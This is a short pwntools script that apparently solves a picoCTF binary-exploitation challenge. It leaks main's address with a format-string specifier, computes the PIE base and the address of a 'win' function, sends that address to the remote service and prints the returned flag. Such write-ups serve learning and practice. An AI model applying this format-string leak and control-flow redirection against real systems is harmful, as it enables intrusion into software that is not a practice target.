from pwn import *

context.binary = elf = ELF("./vuln", checksec=False)
#io = elf.process()
io = remote("rescued-float.picoctf.net", 49795)
#context.log_level = "debug"

# step 1: leak main address
io.sendlineafter(b":", b"%19$p")
io.recvuntil(b"0x")
main_addr_leak = int(io.recvline().strip(), 16)
log.info(f"Leaked main address + offset: {hex(main_addr_leak)}")

base = main_addr_leak - (elf.symbols["main"] + 0x41) # find the base address by finding the difference between our leaked main and our main plus the offset
calculated_win_addr = base + elf.symbols["win"]
log.info(f"Calculated win address: {hex(calculated_win_addr)}")

io.sendlineafter(b": ", hex(calculated_win_addr).encode())
io.recvuntil(b"You won!\n")
flag = io.recvline().strip().decode()
log.success(flag)

io.close()
